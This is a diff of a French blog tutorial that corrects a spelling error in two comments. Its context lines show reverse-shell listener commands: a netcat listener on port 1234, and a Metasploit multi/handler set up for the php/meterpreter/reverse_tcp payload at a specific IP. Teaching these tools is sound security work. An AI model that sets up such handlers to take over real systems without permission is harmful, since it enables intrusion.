@@ -18,14 +18,14 @@ Dans cet article, je vous montre un simple usage de netcat et meterpreter. Pour 
 ---------------------------------------------
 #### Méthode 1: Utiliser netcat
   <pre><code data-trim class="yaml">
-      #se mette sous écoute sur le port 1234
+      #se mettre sous écoute sur le port 1234
       netcat -lvp 1234 
   </code></pre> <br/>
      
 ---------------------------------------------
 #### Méthode 2: Utiliser meterpreter
   <pre><code data-trim class="yaml">
-      #se mette sous écoute sur le port 1234 et l'IP 10.23.201.17 en utilisant le payload php
+      #se mettre sous écoute sur le port 1234 et l'IP 10.23.201.17 en utilisant le payload php
       msfconsole
       use exploit/multi/handler
       set payload php/meterpreter/reverse_tcp
